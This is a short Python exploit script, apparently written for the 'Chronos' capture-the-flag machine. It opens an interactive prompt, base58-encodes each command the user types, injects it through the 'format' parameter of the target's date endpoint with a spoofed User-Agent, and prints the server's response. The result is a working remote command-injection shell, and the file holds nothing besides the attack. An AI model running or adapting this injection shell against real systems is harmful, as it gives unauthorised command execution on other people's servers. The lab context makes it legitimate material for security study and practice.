#!/usr/bin/env python3

import requests
import sys
import base58
from requests.api import options

n = len(sys.argv)
if n <= 1:
    print("Usage: python3 chronos.py url")
    print("Eg: python3 chronos.py http://chronos.local:8000/")
    exit(0)

#request
def doReq(cmd):
    #payload processing
    PAYLOAD=str(cmd).strip()
    PAYLOAD=base58.b58encode(PAYLOAD.encode())
    s = requests.Session()
    headers = {"User-Agent":"Chronos"}
    r = s.get(f"{sys.argv[1]}date?format={PAYLOAD.decode()}", headers=headers)
    print(f"Payload: {base58.b58decode(PAYLOAD).decode()}")
    if "e>Error</t" in r.text:
        print("Error")
    else:        
        print(f"\n{r.text}")
        


while True:
    cmd = input("$: ")
    doReq(cmd)
